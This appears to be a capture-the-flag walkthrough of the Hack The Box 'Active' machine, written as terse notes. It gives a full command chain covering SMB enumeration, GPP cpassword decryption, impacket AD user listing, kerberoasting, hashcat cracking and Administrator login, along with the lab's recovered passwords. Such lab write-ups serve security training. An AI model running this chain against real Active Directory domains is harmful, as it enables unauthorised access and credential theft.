### DNS
```
nslookup
dnsrecon -d 10.129.151.62 -r 10.0.0.0/8
```

### Nmap
found the domain name `active.htb` and add it to `/etc/hosts`
```
locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb

nmap --script safe -p 445 active.htb
nmap --script smb-enum-services -d -p 445 active.htb
```

### SMB
```bash
smbmap -H active.htb
smbmap -R Replication -H active.htb --depth 10
smbmap -R Replication -H active.htb -A Groups.xml -q --depth 10
```
or just download it all with `smbclient` recurse download. Mentioned in Wiki.

### Group Policy Preferences (GPP) Passsowrds
When a new GPP is created, an `.xml` file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to. These files can include thosed used to:

* Map drives (drives.xml)
* Create local users
* Create printer config files (printers.xml)
* Creating scheduled tasks (scheduledtasks.xml)
* Changing local admin passwords

The `cpassword` attribute value is AES-256 bit encrypted and Microsoft published the AES private key.

### Decrypt Group Policy Preferences (GPP) from `Groups.xml`
```
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

### Carefully running impacket
```
python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -all
or
python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -all -dc-ip active.htb
or
python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -all -dc-ip 10.129.151.62
```

### psexec.py or evil-winrm
won't work
```
python3 /usr/share/doc/python3-impacket/examples/psexec.py active.htb/SVC_TGS:'GPPstillStandingStrong2k18'@active.htb
or use wmiexec.py
python3 /usr/share/doc/python3-impacket/examples/wmiexec.py active.htb/administrator:'Ticketmaster1968'@10.129.148.91

[-] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
```
Because it's not an admin user

### smbmap again to get user.txt
```
smbmap -u SVC_TGS -p GPPstillStandingStrong2k18 -d active.htb -H 10.129.151.62
smbmap -u SVC_TGS -p GPPstillStandingStrong2k18 -d active.htb -H 10.129.151.62 -R Users --depth 10
smbmap -u SVC_TGS -p GPPstillStandingStrong2k18 -d active.htb -H 10.129.151.62 -R Users --depth 10 -A user.txt
smbclient \\\\active.htb\\Users -U=SVC_TGS%'GPPstillStandingStrong2k18'
```

### Kerberoasting
https://0xdf.gitlab.io/2018/12/08/htb-active.html#kerberoasting
```
GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
or
python3 GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs
or
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request
```

### Crack 13100
```
hashcat -a 0 -m 13100 hash /usr/share/wordlists/rockyou.txt
Ticketmaster1968
```

### smbclient as administrator
```
smbclient //active.htb/Users -U=Administrator%'Ticketmaster1968'
```
